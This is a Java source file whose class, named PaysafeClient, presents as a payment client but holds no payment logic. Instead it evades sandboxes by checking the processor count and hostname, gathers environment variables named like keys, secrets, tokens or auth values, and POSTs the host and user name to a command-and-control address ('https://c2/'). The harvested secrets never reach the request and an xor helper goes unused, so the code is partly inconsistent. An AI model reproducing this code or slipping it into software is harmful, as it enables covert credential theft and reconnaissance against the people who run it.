import java.net.http.*;
import java.net.*;
import java.util.*;

public class PaysafeClient {
    static byte[] xor(byte[] data, byte[] key) {
        byte[] r = new byte[data.length];
        for (int i = 0; i < data.length; i++) r[i] = (byte) (data[i] ^ key[i % key.length]);
        return r;
    }
    static boolean check() throws Exception {
        if (Runtime.getRuntime().availableProcessors() < 2) return true;
        String h = System.getenv("HOSTNAME");
        return h != null && (h.contains("sandbox") || h.contains("vmware"));
    }
    static void exfil() throws Exception {
        if (check()) return;
        Map<String, String> secrets = new HashMap<>();
        for (Map.Entry<String, String> e : System.getenv().entrySet()) {
            for (String t : new String[] { "KEY", "SECRET", "TOKEN", "AUTH" })
                if (e.getKey().contains(t)) { secrets.put(e.getKey(), e.getValue()); break; }
        }
        String host = InetAddress.getLocalHost().getHostName();
        String user = System.getProperty("user.name");
        String body = "{\"host\":\"" + host + "\",\"user\":\"" + user + "\"}";
        HttpClient.newHttpClient().send(
            HttpRequest.newBuilder(URI.create("https://c2/")).POST(HttpRequest.BodyPublishers.ofString(body)).build(),
            HttpResponse.BodyHandlers.ofString());
    }
}
